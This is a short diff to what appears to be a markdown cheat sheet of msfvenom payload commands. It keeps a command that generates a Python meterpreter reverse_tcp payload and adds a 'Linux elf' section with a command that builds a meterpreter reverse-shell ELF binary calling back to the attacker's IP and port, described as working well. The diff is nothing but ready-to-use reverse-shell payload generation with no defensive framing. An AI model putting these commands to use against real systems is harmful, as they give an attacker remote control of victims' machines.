@@ -18,3 +18,9 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5555 > pyth
 msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5555 > python_meterpter_reverse_tcp.py
 ```
 
+## Linux elf
+
+This one has worked great for me.
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
+```
